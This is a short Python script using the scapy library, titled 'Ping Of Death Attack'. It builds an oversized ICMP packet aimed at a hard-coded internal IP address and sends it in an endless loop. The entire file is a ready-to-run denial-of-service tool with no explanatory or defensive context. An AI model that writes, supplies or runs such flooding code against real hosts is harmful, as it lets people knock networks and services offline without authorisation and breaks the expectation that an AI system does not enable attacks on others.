import scapy.all as scapy
from scapy.layers.inet import IP, TCP, ICMP, UDP
import threading

"""
Ping Of Death Attack
"""

target_ip = "10.12.0.40"

def pingofdeath():
    p=IP(dst=target_ip, flags=2, frag=0)/ICMP()/("x"*65000)
    scapy.send(p, verbose=0, loop=1)

pingofdeath()